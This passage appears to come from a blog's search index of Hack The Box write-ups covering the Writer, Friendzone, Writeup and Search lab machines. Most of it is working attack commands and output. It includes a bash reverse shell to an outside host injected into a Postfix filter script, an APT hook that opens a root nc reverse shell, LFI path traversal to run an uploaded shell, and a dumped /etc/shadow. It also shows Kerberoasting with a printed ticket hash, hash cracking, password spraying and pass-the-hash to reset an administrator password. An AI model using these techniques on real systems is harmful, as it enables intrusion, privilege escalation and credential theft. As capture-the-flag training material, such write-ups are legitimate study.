${extension} ${user}\n#  flags=R user=cyrus argv=/cyrus/bin/deliver -e -m ${extension} ${user}\n  flags=Fqhu user=uucp argv=uux -r -n -z -a$sender - $nexthop!rmail ($recipient)\n  flags=F user=ftn argv=/usr/lib/ifmail/ifmail -r $nexthop ($recipient)\n  flags=Fq. user=bsmtp argv=/usr/lib/bsmtp/bsmtp -t$nexthop -f$sender $recipient\n  flags=R user=scalemail argv=/usr/lib/scalemail/bin/scalemail-store ${nexthop} ${user} ${extension}\n  flags=FR user=list argv=/usr/lib/mailman/bin/postfix-to-mailman.py\n  flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}\nAnalyzing the last line means /etc/postfix/disclaimer will be executed if a new mail is received from user john.\nkyle@writer:/etc/postfix$ ls -al | grep discl\n  -rwxrwxr-x   1 root filter  1022 Sep 10 13:44 disclaimer\nThe disclaimer-file is owned by group filter, meaning kyle should be able to modify it - making it possible to inject a shell to be executed when triggered.\n\n\n\nStep 2\nEdit disclaimer and change to #!/bin/bash, and paste a (bash) reverse shell. Send a mail with netcat and wait for shell. Ideally this should be scripted with python or at the very least bash.\nkyle@writer:/etc/postfix$ vim disclaimer\nkyle@writer:/etc/postfix$ nc localhost 25\n  220 writer.htb ESMTP Postfix (Ubuntu)\n  HELO writer.htb\n    250 writer.htb\n  MAIL FROM:&lt;kyle@writer.htb&gt;\n    250 2.1.0 Ok\n  RCPT TO:&lt;kyle@writer.htb&gt;\n    250 2.1.5 Ok\n  DATA\n    354 End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;\n  Subject: Hack Tack!\n  .\n    250 2.0.0 Ok: queued as 9FF0C802\n\n┌──(void㉿kali)-[~/Documents]\n└─$ nc -lvnp 4488\n  listening on [any] 4488 ...\n  connect to [10.10.14.2] from (UNKNOWN) [10.10.11.101] 33778\n  bash: cannot set terminal process group (371156): Inappropriate ioctl for device\n  bash: no job control in this shell\n  john@writer:/var/spool/postfix$ id\n    uid=1001(john) gid=1001(john) groups=1001(john)\nHere’s a quick and dirty bash script I made to automate the process:\nkyle@writer:/dev/shm$ cat noob.sh \necho -e '#!/bin/bash\\nbash -i &gt;& /dev/tcp/10.10.14.2/4488 0&gt;&1' &gt; /etc/postfix/disclaimer\nsleep 1\n(   echo 'HELO writer.htb'\n    sleep 1\n    echo 'MAIL FROM:&lt;kyle@writer.htb&gt;'\n    sleep 1\n    echo 'RCPT TO:&lt;kyle@writer.htb&gt;'\n    sleep 1\n    echo 'DATA'\n    sleep 1\n    echo 'Subject: Plz give revshell'\n    sleep 1\n    echo 'Hello Mr.\\nPlease give me a reverse shell.\\n\\nBest wishes,\\nP3'\n    echo .\n    echo QUIT ) | nc -v localhost 25\nNot sure how and why this gave us a shell for user john, when I sent the mail to and from kyle. Reading on hacktricks we have the following example: &gt; For example the line flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient} means that /etc/postfix/filtering will be executed if a new mail is received by the user mark\nWith this logic we recipient should be john, in order to spawn the new shell. But maybe it’s just that the script is triggered by user john?\n\n\n\nStep 3\nGet persistence as John and grab his private key, relogin.\n┌──(void㉿void)-[/git/htb/writer]\n└─$ ssh john@writer.htb -i john-id_rsa\njohn@writer:~$ id\nuid=1001(john) gid=1001(john) groups=1001(john),1003(management)\nSince john is in group management I assume the privesc has something to do with that. Start to look for files and directories owned by group management.\njohn@writer:/dev/shm$ find / -type f -group management 2&gt;/dev/null\njohn@writer:/dev/shm$ find / -type d -group management 2&gt;/dev/null\n/etc/apt/apt.conf.d\nWe (management) own apt.conf.d meaning we can abuse cron job to get a root shell. Looking through the running processes with pspy64 we can see that /usr/bin/apt-get update is executed frequently. We can exploit this by creating our own malicious file inside apt.conf.d to be executed along with apt-get update.\njohn@writer:/dev/shm$ ./pspy64\n..\n2021/09/14 08:26:01 CMD: UID=0    PID=250774 | /usr/bin/find /etc/apt/apt.conf.d/ -mtime -1 -exec rm {} ; \n2021/09/14 08:26:01 CMD: UID=0    PID=250777 | /usr/sbin/CRON -f \n2021/09/14 08:26:01 CMD: UID=0    PID=250776 | /usr/sbin/CRON -f \n2021/09/14 08:26:01 CMD: UID=0    PID=250779 | /usr/sbin/CRON -f \n2021/09/14 08:26:01 CMD: UID=0    PID=250780 | /usr/bin/apt-get update \n2021/09/14 08:26:01 CMD: UID=0    PID=250781 | /usr/bin/apt-get update \n2021/09/14 08:26:01 CMD: UID=0    PID=250784 | /bin/sh -c /usr/bin/cp /root/.scripts/master.cf /etc/postfix/master.cf \n2021/09/14 08:26:01 CMD: UID=0    PID=250783 | /usr/bin/cp -r /root/.scripts/writer2_project /var/www/ \n2021/09/14 08:26:01 CMD: UID=0    PID=250782 | /bin/sh -c /usr/bin/cp -r /root/.scripts/writer2_project /var/www/ \n2021/09/14 08:26:01 CMD: UID=0    PID=250785 | /usr/lib/apt/methods/http \n2021/09/14 08:26:01 CMD: UID=0    PID=250786 | /usr/bin/apt-get update \n2021/09/14 08:26:01 CMD: UID=33   PID=250787 | /usr/bin/python3 manage.py runserver 127.0.0.1:8080 \njohn@writer:/etc/apt/apt.conf.d$ cat 15update-stamp \nAPT::Update::Post-Invoke-Success {\"touch /var/lib/apt/periodic/update-success-stamp 2&gt;/dev/null || true\";};\njohn@writer:/etc/apt/apt.conf.d$ echo 'APT::Update::Pre-Invoke {\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&1|nc 10.10.14.2 4488 &gt;/tmp/f\";};' &gt; pwn\nWait a few seconds and we’ll get a root shell.\n┌──(void㉿void)-[~/Documents/scanners/linux]\n└─$ nc -lvnp 4488                                                                                                                 1 ⨯\nlistening on [any] 4488 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.11.101] 52798\n/bin/sh: 0: can't access tty; job control turned off\n# id && hostname\nuid=0(root) gid=0(root) groups=0(root)\nwriter\n# cat /root/root.txt\nf77d661fda2c7db3f5e3f04f17a64490\n\n# cat /etc/shadow\nroot:$6$gev1Op0YfgboE7iR$iMNbP.8qic/SzTr4atxwLbkI7nScyZWJPbTgoXAlEz5Hcw3Ntget9j3p.iccPcw5Jl4dj4bHWZ5LvoLLNC8iB.:18816:0:99999:7:::\nkyle:$6$Rke6Q45ycHoY4Ubp$5mG3iCMK/tnLRjVXQupFh0IJAz7TcBrLJl8DZqOnboZMnOaHTM3lOxacYj3zVcR1MJ8EeSZxuAdETDlldpw7p1:18765:0:99999:7:::\njohn:$6$jnLfY8nfX7rgN0kn$gy5CL/IZikTiLcBZVHVEu5Kl/imxKmSvooN1JjohPjVLIygTts8HNaLRAEr7zoaCk7/pb9jzKBbgBSEdxwknj0:18761:0:99999:7:::\nmysql:!:18762:0:99999:7:::\n\n\n\n\nREFERENSES\nSQL Injection: - https://medium.com/@Kan1shka9/pentesterlab-from-sql-injection-to-shell-walkthrough-7b70cd540bc8 - https://asdqw3.medium.com/remote-image-upload-leads-to-rce-inject-malicious-code-to-php-gd-image-90e1e8b2aada\nPostfix: - https://book.hacktricks.xyz/pentesting/pentesting-smtp#postfix\nAPT Reverse Shell: - https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/"
  },
  {
    "objectID": "posts/2019-06-17-htb-writeup-friendzone/2019-06-17-htb-writeup-friendzone.html",
    "href": "posts/2019-06-17-htb-writeup-friendzone/2019-06-17-htb-writeup-friendzone.html",
    "title": "Friendzone - Hack The Box",
    "section": "",
    "text": "Enum standard + extra smb\nnmap -sC -sV -O 10.10.10.123\nnmap --script=smb-enum-shares 10.10.10.123 \nGrab cred.txt\nsmbclient //10.10.10.123/general\nget creds.txt\nZone Transfer to find subdomains\ndig axfr friendzone.red @10.10.10.123\nAdd subdomains to /etc/hosts\n10.10.10.123 friendzone.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red\nLogin as administrator1 with credentials found from cred.txt\nUpload reverse shell through SMB\nsmbclient //10.10.10.123/Development\nput r\nPrepare nc to grab reverse shell\nnc -lnvp 4455\nUse LFI through dashboard.php to trigger reverse shell.\nWith previous enumeration of smb shares we found the path to /etc/Development where our shell will be uploaded.\ndashboard.php?image_id=a.jpg&pagename=../../../../../etc/Development/r\n\nNOTE1:\n\n\nProbably smart to upload a test file, like &lt;?php phpinfo(); ?&gt;, before going for the reverse shell.\n\n\nNOTE2:\n\n\nThe php call will look something like this: &lt;?php “include/”.include($_GET['pagename'].“.php”); ?&gt;\n\n\nDo not end your filename with .php as this is already done in the code and you’ll create a double file ending.\n\nGrab user: /home/friend/user.txt\nGrab SSH-creds:\nls /var/www/htm/mysql_data.conf\n(f*****:A*************)"
  },
  {
    "objectID": "posts/2019-06-17-htb-writeup-friendzone/2019-06-17-htb-writeup-friendzone.html#enumeration",
    "href": "posts/2019-06-17-htb-writeup-friendzone/2019-06-17-htb-writeup-friendzone.html#enumeration",
    "title": "Friendzone - Hack The Box",
    "section": "",
    "text": "Enum standard + extra smb\nnmap -sC -sV -O 10.10.10.123\nnmap --script=smb-enum-shares 10.10.10.123 \nGrab cred.txt\nsmbclient //10.10.10.123/general\nget creds.txt\nZone Transfer to find subdomains\ndig axfr friendzone.red @10.10.10.123\nAdd subdomains to /etc/hosts\n10.10.10.123 friendzone.red administrator1.friendzone.red hr.friendzone.red uploads.friendzone.red\nLogin as administrator1 with credentials found from cred.txt\nUpload reverse shell through SMB\nsmbclient //10.10.10.123/Development\nput r\nPrepare nc to grab reverse shell\nnc -lnvp 4455\nUse LFI through dashboard.php to trigger reverse shell.\nWith previous enumeration of smb shares we found the path to /etc/Development where our shell will be uploaded.\ndashboard.php?image_id=a.jpg&pagename=../../../../../etc/Development/r\n\nNOTE1:\n\n\nProbably smart to upload a test file, like &lt;?php phpinfo(); ?&gt;, before going for the reverse shell.\n\n\nNOTE2:\n\n\nThe php call will look something like this: &lt;?php “include/”.include($_GET['pagename'].“.php”); ?&gt;\n\n\nDo not end your filename with .php as this is already done in the code and you’ll create a double file ending.\n\nGrab user: /home/friend/user.txt\nGrab SSH-creds:\nls /var/www/htm/mysql_data.conf\n(f*****:A*************)"
  },
  {
    "objectID": "posts/2019-06-13-htb-writeup-writeup/2019-06-13-htb-writeup-writeup.html",
    "href": "posts/2019-06-13-htb-writeup-writeup/2019-06-13-htb-writeup-writeup.html",
    "title": "Writeup - Hack The Box",
    "section": "",
    "text": "ROOT\nUsing pspy64 we can see that run-parts is triggered on login.\nFind the PATH order the scripts are executed:\njkr@writeup:~$ echo $PATH\n/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games\nLook at the path for run-parts to see if we can exploit the order:\njkr@writeup:~$ which run-parts\n/bin/run-parts\nNoticed that both /usr/local/bin and /usr/bin is before /bin in order of script execution. So I made a reverse-shell script called run-parts and placed it in the /usr/local/bin dir.\nStart nc on local host, log out and in again from jkr@writeup to trigger scripts and boom - reverse root shell.\n\nINFO ABOUT PATH:\n\n\nQ: If there are multiple executable files in PATH with the same name which one is preferred?\n\n\nA: It stops at the first one it finds, reading $PATH left to right.\n\n\nQ: Is current directory included in the search when file is executed?\n\n\nA: If the current directory is in PATH then it is searched. Remember that an empty directory in PATH includes the current directory. e.g. PATH=:/usr/bin (leading empty) PATH=/usr/bin: (trailing empty) and PATH=/usr/bin::/bin (middle empty) will all effectively include current working directory."
  },
  {
    "objectID": "posts/2022-01-05-htb-writeup-search/2022-01-05-htb-writeup-search.html",
    "href": "posts/2022-01-05-htb-writeup-search/2022-01-05-htb-writeup-search.html",
    "title": "Search - Hack The Box",
    "section": "",
    "text": "USER\n\nStep 1\nnmap:\n┌──(void㉿void)-[/htb/search]\n└─$ nmap -p- 10.10.11.129\nPORT      STATE SERVICE\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n443/tcp   open  https\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n8172/tcp  open  unknown\n9389/tcp  open  adws\n49666/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n49695/tcp open  unknown\n49705/tcp open  unknown\n\n\n┌──(void㉿void)-[/htb/search]\n└─$ nmap -Pn -n -sCV -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389,4966,49669,49670,49695,49705 10.10.11.129\nPORT      STATE    SERVICE       VERSION\n53/tcp    open     domain        Simple DNS Plus\n80/tcp    open     http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Search &mdash; Just Testing IIS\n88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2022-01-03 08:57:12Z)\n135/tcp   open     msrpc         Microsoft Windows RPC\n139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=research\n| Not valid before: 2020-08-11T08:13:35\n|_Not valid after:  2030-08-09T08:13:35\n|_ssl-date: 2022-01-03T08:58:40+00:00; +2m17s from scanner time.\n443/tcp   open     ssl/http      Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Search &mdash; Just Testing IIS\n| ssl-cert: Subject: commonName=research\n| Not valid before: 2020-08-11T08:13:35\n|_Not valid after:  2030-08-09T08:13:35\n|_ssl-date: 2022-01-03T08:58:40+00:00; +2m17s from scanner time.\n| tls-alpn: \n|_  http/1.1\n445/tcp   open     microsoft-ds?\n464/tcp   open     kpasswd5?\n593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=research\n| Not valid before: 2020-08-11T08:13:35\n|_Not valid after:  2030-08-09T08:13:35\n|_ssl-date: 2022-01-03T08:58:40+00:00; +2m17s from scanner time.\n3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=research\n| Not valid before: 2020-08-11T08:13:35\n|_Not valid after:  2030-08-09T08:13:35\n|_ssl-date: 2022-01-03T08:58:40+00:00; +2m17s from scanner time.\n3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=research\n| Not valid before: 2020-08-11T08:13:35\n|_Not valid after:  2030-08-09T08:13:35\n|_ssl-date: 2022-01-03T08:58:40+00:00; +2m17s from scanner time.\n4966/tcp  filtered unknown\n8172/tcp  open     ssl/http      Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Site doesn't have a title.\n| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH\n| Not valid before: 2020-04-07T09:05:25\n|_Not valid after:  2030-04-05T09:05:25\n|_ssl-date: 2022-01-03T08:58:40+00:00; +2m17s from scanner time.\n| tls-alpn: \n|_  http/1.1\n9389/tcp  open     mc-nmf        .NET Message Framing\n49669/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49670/tcp open     msrpc         Microsoft Windows RPC\n49695/tcp open     msrpc         Microsoft Windows RPC\n49705/tcp open     msrpc         Microsoft Windows RPC\nService Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 2m16s, deviation: 0s, median: 2m16s\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2022-01-03T08:58:05\n|_  start_date: N/A\ndirb:\n==&gt; DIRECTORY: http://10.10.11.129/certenroll/\n+ http://10.10.11.129/certsrv (CODE:401|SIZE:1293)\n==&gt; DIRECTORY: http://10.10.11.129/css/\n==&gt; DIRECTORY: http://10.10.11.129/fonts/\n==&gt; DIRECTORY: http://10.10.11.129/images/\n==&gt; DIRECTORY: http://10.10.11.129/Images/\n+ http://10.10.11.129/index.html (CODE:200|SIZE:44982)\n==&gt; DIRECTORY: http://10.10.11.129/js/\n+ http://10.10.11.129/staff (CODE:403|SIZE:1233) \nnikto:\nPORT 80:\n+ Server: Microsoft-IIS/10.0\n+ Retrieved x-aspnet-version header: 4.0.30319\nffuf:\nN/A\nDomain: search.htb Hostname: research\nLooking closely on the webpage we find THIS IMAGE containing the password IsolationIsKey? and user Hope Sharp.\n![[Pasted image 20220103130917.png]]\nUsing namemash.py we can create the most common permutations of Hope Sharp to hopefully get a valid username.\n┌──(void㉿void)-[/htb/search]\n└─$ cat hope.txt     \nHope Sharp\n\n┌──(void㉿void)-[/htb/search]\n└─$ /opt/namemash.py hope.txt &gt; hope-username.txt\n\n┌──(void㉿void)-[/htb/search]\n└─$ cat hope-username.txt \nhopesharp\nsharphope\nhope.sharp\nsharp.hope\nsharph\nhsharp\nshope\nh.sharp\ns.hope\nhope\nsharp\n\n\n\nStep 2\nTrying to dump hashes with GetNPUsers we find that hope.sharp is a valid user, however PREAUTH is not set.\n┌──(void㉿void)-[/htb/search]\n└─$ impacket-GetNPUsers search.htb/ -usersfile hope-username.txt -format hashcat -dc-ip 10.10.11.129 -outputfile hash.txt                                 1 ⨯\nImpacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation\n\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] User hope.sharp doesn't have UF_DONT_REQUIRE_PREAUTH set\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\n[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)\nTo get a quick overview of the domain we can use ldapdomaindump, this will provide data similar to the Windows tool ADsearch.exe.\n┌──(void㉿void)-[/htb/search]\n└─$ ldapdomaindump 10.10.11.129 -u 'search.htb\\hope.sharp' -p 'IsolationIsKey?' -o ldapdump.out\n[*] Connecting to host...\n[*] Binding to host\n[+] Bind OK\n[*] Starting domain dump\n[+] Domain dump finished\nFrom the dump we find a few interesting things.. .. Credentials hope.sharp:IsolationIsKey? is correct and working.\n.. Computers: ![[Pasted image 20220103134201.png]] ![[Pasted image 20220103134647.png]]\n.. Users: ![[Pasted image 20220103134335.png]] ![[Pasted image 20220103134421.png]] ![[Pasted image 20220103134819.png]] ![[Pasted image 20220103134855.png]] ![[Pasted image 20220103134934.png]]\n.. Groups: ![[Pasted image 20220103135204.png]]\nExtract all users to a new .txt list.\n┌──(void㉿void)-[/htb/search/ldapdump.out]\n└─$ awk '{print $5}' domain_users.grep &gt; domain-users.txt\nTrying password re-use with the list of all valid users over LDAP and SMB fails.\n\n\n\nStep 3\nWith a valid set of credentials the next logical step for me would be to gather more information about the domain with Bloodhound to see if there are any roastable users, or other weak chains that we can exploit.\n┌──(void㉿void)-[/htb/search]\n└─$ bloodhound-python -u hope.sharp -p 'IsolationIsKey?' -ns 10.10.11.129 -d search.htb -c all\nINFO: Found AD domain: search.htb\nINFO: Connecting to LDAP server: research.search.htb\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 113 computers\nINFO: Connecting to LDAP server: research.search.htb\nINFO: Found 106 users\nINFO: Found 63 groups\nINFO: Found 0 trusts\n[... snip ...]\nRunning the raw query MATCH (u:User {hasspn:true}) RETURN u in Bloodhound we find all users that are Kerberoastable, where we get a match on user web_svc.\n![[Pasted image 20220104084939.png]]\n┌──(void㉿void)-[/htb/search]\n└─$ impacket-GetUserSPNs search.htb/Hope.Sharp:IsolationIsKey? -request   \nImpacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation\n\nServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation \n---------------------------------  -------  --------  --------------------------  ---------  ----------\nRESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 14:59:11.329031  &lt;never&gt;               \n\n$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$bcaea98d34938aaf0f71290965b41e6c$32ee2f404583f6ff18c9dfc97fa4bf66c740dfb9ed1f72040dd09e579075dd3413c0a2b4129dfaa17fc1860e82a8e705954a5026985f34b4a42bdb87ae73fcf00ebcd1a7d51f92b0d7d1eb2d590fa105eb7b7e392d26dec89499fd1aff98561cad219c1b928d7093debd78399ddff49908079115704f3814c4b469d278fa500ccdaa1c5fa5c5564e36602f7e7a0ca2d53deafe1f4eaef5362ccc88a321956568648e19a6457b002f08e4244239b57695ad9ab364d54de4944e80ec83827c24fc2e30e76e38733d2182a74ae29f7e08f35dc6365197d2dc2d74417800fa3a519812b991ade1ea45300cf82d1cf5e45083f7bf8e3d628ab68b13f579ce7415bd8cab13728a962d343277a22c1bea5edcbcbab1cec9517322378fb3fdde89576d56b67a84d70039725fc0794f786bbce8adec3daa64f2c6e46d54e0eb19c3192663950e250f50410357fdd5599e4a93cc7b51243f8149a50b65e1504cb3be183ee6c13ca2dbd869ff7305c8fa1018afb2303cdd165c0980fa42704aaffab17a1e2c1dd67a6697b000af3381f1ed2b9b8d0700e4ef59109f2c88e9df232b22c3c143cb92374495fccff957f900bab0326ae7cab850b61c7941c1dbcad1f8f50a804c5c450fba9ffd7b7a7f05b1566f01be596bdd87cd410927c94bf81bdb384fef3d6cde25d0e25f7f390bb8e21e7f2fb4c20ff85d6baa0a849b187ae3bbb28709b369aa279b32b3514e806f3f291ea2bc728a5475e7cf1d142ddc37136108a18d2886b500b12ea9d0cec3bc46aa3f486332084f9e38efef6a3a3089c3540da166cf266f49c4e049ec45b05a93731fca58c209abd5fe862ddfd426f9e6f8ad23c61817b6941588378c029249b25dd513ce691d338b25ac854d0b26046cd9f185216a46b05a8bdadf9f4de035a3222cd680eea13e1cdcfd517165d73d444d08c8a9453c298fe4880029c54897d08a9f45beb8429d71b22af79c3c6fe2c701b279e6444341c17b715840e3d208d6d95b7c7d82973f31c9357363bbf673291bd8e5e8fe933abe6a1ce09348967552d039bcc6302f6ce01966d6af0ed049f84efabdb734db987fed47f75a9ab5e6ceddf58350a999b574531511820c4d78d42c2b3d5914dc98da9acae8841d5a7080fb745161c80005f33d3b19b3c2f9d5ad0f9cf126812fca1385380ff5963d5392dd47b0f2e620127df20fa34e41c602494e2509c9336f8803b22bdd2253ee21632fe21020ca4a4c489e6623fbb8285fe134267a8635ad0efaea60f6dc576d8d887658ded96f0e0d4fa8d82a56f087aca73b1ac99698af69c93f46bd12509f89f840230c6e7dc6bebfd9c08f64e437a77ecff6e1aa92697c6623b6664ac489ceda0932cc64648d255671ea8415ac2a4f142e8a37d26e7c7ed8d4c81b0adbf29135bd60f94095de88e46ff81d9a415967e75be62e1d51098e8b3c5a2ff577ebb6035a50faff9ab2802dd120\n┌──(void㉿void)-[/htb/search]\n└─$ hashcat -a0 -m13100 web_svc-hash.txt /usr/share/wordlists/rockyou.txt\n[... snip ...]\n\n@3ONEmillionbaby\n                                                 \nSession..........: hashcat\nStatus...........: Cracked\nHash.Name........: Kerberos 5, etype 23, TGS-REP\nWith the set of credentials web_svc:@3ONEmillionbaby the first thing I’d like to do is spray the other users with the found password.\n┌──(void㉿void)-[/htb/search]\n└─$ crackmapexec ldap 10.10.11.129 -u domain-users.txt -p '@3ONEmillionbaby' --continue-on-success\nLDAP        10.10.11.129    389    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\Tristan.Davies:@3ONEmillionbaby\nLDAP        10.10.11.129    389    RESEARCH         [+] search.htb\\web_svc:@3ONEmillionbaby \n[... snip ...]\nLDAP        10.10.11.129    389    RESEARCH         [+] search.htb\\Edgar.Jacobs:@3ONEmillionbaby\nGreat another set! Now we have the following three creds: 1. hope.sharp:IsolationIsKey? 2. web_svc:@3ONEmillionbaby 3. edgar.jacobs:@3ONEmillionbaby\n\n\n\nStep 4\nNext lets look through the SMB shares of all the users.\n┌──(void㉿void)-[/htb/search]\n└─$ smbclient -L 10.10.11.129 -U hope.sharp                     \nEnter WORKGROUP\\hope.sharp password: \n\n    Sharename       Type      Comment\n    ---------       ----      -------\n    ADMIN$          Disk      Remote Admin\n    C$              Disk      Default share\n    CertEnroll      Disk      Active Directory Certificate Services share\n    helpdesk        Disk      \n    IPC$            IPC       Remote IPC\n    NETLOGON        Disk      Logon server share \n    RedirectedFolders$ Disk      \n    SYSVOL          Disk      Logon server share\n┌──(void㉿void)-[/htb/search]\n└─$ smbclient \\\\\\\\10.10.11.129\\\\RedirectedFolders$ -U edgar.jacobs\nEnter WORKGROUP\\edgar.jacobs password: \nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; recurse\nsmb: \\&gt; ls\n[... snip ...]\n\\sierra.frye\n  .                                  Dc        0  Thu Nov 18 02:01:46 2021\n  ..                                 Dc        0  Thu Nov 18 02:01:46 2021\n  Desktop                           DRc        0  Thu Nov 18 02:08:00 2021\n  Documents                         DRc        0  Fri Jul 31 16:42:19 2020\n  Downloads                         DRc        0  Fri Jul 31 16:45:36 2020\n  user.txt                           Ac       33  Thu Nov 18 01:55:27 2021\n  \n[... snip ...]\n\n\\edgar.jacobs\\Desktop\n  .                                 DRc        0  Mon Aug 10 12:02:16 2020\n  ..                                DRc        0  Mon Aug 10 12:02:16 2020\n  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 22:05:29 2020\n  desktop.ini                      AHSc      282  Mon Aug 10 12:02:16 2020\n  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 22:05:03 2020\n  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 12:35:44 2020\nWe are not able to view or download the user flag yet, so instead download Phising_Attempt.xlsx and view the document. We can see that the column C is hidden, and the option to unhide is greyed out - this is because the document is protected. ![[Pasted image 20220104091939.png]]\n![[Pasted image 20220104092027.png]]\nWe can easily bypass this by opening the .xlsx in Kali using Archive Manager. Go to xl &gt; worksheets &gt; open and edit sheet2.xml. Search for sheetProtection and remove the section. Save the file and you should now be able to unhide column C.\n![[Pasted image 20220104092957.png]]\n![[Pasted image 20220104093251.png]]\nGrab user.txt that we found earlier in sierra.frye’s SMB directory.\n┌──(void㉿void)-[/htb/search]\n└─$ smbclient \\\\\\\\10.10.11.129\\\\RedirectedFolders$ -U sierra.frye \n\nsmb: \\sierra.frye\\&gt; get user.txt\ngetting file \\sierra.frye\\user.txt of size 34 as user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)\n\n┌──(void㉿void)-[/htb/search]\n└─$ cat user.txt             \nf50460b2d81200ea8e9242bd6560cf13\n\n\n\n\nROOT Method 1\n\nStep 1\nUsing Bloodhound we look for the Shortest Path to Domain Admin and find that users from ITSEC group (which sierra.frye is member of) have ReadGMSAPassword over user BIR-ADFS-GMSA. ![[Pasted image 20220104095416.png]]\n┌──(void㉿void)-[/opt/gMSADumper]\n└─$ python3 gMSADumper.py -u sierra.frye -p '$$49=wide=STRAIGHT=jordan=28$$18' -d search.htb                                                              1 ⨯\nUsers or groups who can read password for BIR-ADFS-GMSA$:\n &gt; ITSec\nBIR-ADFS-GMSA$:::e1e9fd9e46d0d747e1595167eedcec0f\nSince BIR-ADFS-GMSA$ have GenericAll to Domain Administrator Tristan.Davies, we are able to change his password to get root flag. With rpcclient we are able to use both pass-the-hash and change passwords, perfect!\n┌──(void㉿void)-[/htb/search]\n└─$ pth-rpcclient -U search.htb/BIR-ADFS-GMSA$%00000000000000000000000000000000:e1e9fd9e46d0d747e1595167eedcec0f //10.10.11.129                           1 ⨯\nE_md4hash wrapper called.\nHASH PASS: Substituting user supplied NTLM HASH...\nrpcclient $&gt; setuserinfo2 tristan.davies 23 ASDqwe123!\nE_md4hash wrapper called.\nE_deshash wrapper called.\n\n┌──(void㉿void)-[/htb/search]\n└─$ smbclient \\\\\\\\10.10.11.129\\\\C$ -U tristan.davies\nEnter WORKGROUP\\tristan.davies password: ASDqwe123!\n\n[... snip ...]\n\nsmb: \\Users\\Administrator\\Desktop\\&gt; ls\n  .                                 DRc        0  Mon Nov 22 21:21:49 2021\n  ..                                DRc        0  Mon Nov 22 21:21:49 2021\n  desktop.ini                       AHS      282  Mon Nov 22 21:21:49 2021\n  root.txt                          ARc       34  Mon Jan  3 09:51:07 2022\n\nsmb: \\Users\\Administrator\\Desktop\\&gt; get root.txt\ngetting file \\Users\\Administrator\\Desktop\\root.txt of size 34 as root.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)\n\n┌──(void㉿void)-[/htb/search]\n└─$ cat root.txt                                                                      \n33bf73102463a90e0fba8b6b9c3e4387\n\n\n\n\nROOT Method 2\n\nStep 1\nWe 